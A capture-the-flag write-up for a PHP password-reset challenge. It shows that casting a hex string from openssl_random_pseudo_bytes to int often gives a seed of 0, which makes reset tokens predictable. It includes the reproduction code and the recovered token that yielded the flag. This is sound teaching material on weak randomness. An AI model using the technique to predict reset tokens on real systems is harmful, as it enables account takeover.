# Password reset reloaded - Challenge 120

This challenge is like the other password reset challenge except this time the seed is not the time but instead using the more secure openssl_random_pseudo_bytes() function to generate the seed.

The vulnerability here is the following line:

`$seed = (int)bin2hex(openssl_random_pseudo_bytes($size / 2));`

The type casting leads to a type juggling situation where the resulting $seed is sometimes equal to 0.

Let's generate a few tokens with the following:

``` php
$size = 32;
$token = "";
$seed = (int)bin2hex(openssl_random_pseudo_bytes($size / 2));
srand($seed);
for($i = 0; $i < 16; $i++) {
$randomDigit = (string)rand() % 10;
$token .= "," . $randomDigit;
}
$token = str_replace(",", "", $token);
print $token;
```

Here are the tokens generated after running the above code a few times:

1735952265735166 <<
5502620931680800
1735952265735166 <<
1735952265735166 <<
7859402784234612
1735952265735166 <<

Notice that the 1735952265735166 token appears more often, this is statistically very unlikely to occur if the seed is truly random.

Let's dig deeper and check what seed is being generated:
 
``` php
$size = 32;
print((int)bin2hex(openssl_random_pseudo_bytes($size / 2)));
```

Output:

```
42877
0
9
6514
0
0
42525369
0
21
877
0
```

Ok, the seed is often 0 because of the type casting, this confirms our theory.

Unfortunately, submitting 1735952265735166 as the recovery key didn't work for me. I tried the same PHP code under Linux instead of MacOS and I got a different token. This token worked as the recovery key and I was able to get the flag.

```
1928470578251875
3675356291270936 <<
3675356291270936 <<
8504939746844277
3984011852107793
3267998061542056
3675356291270936 <<
```


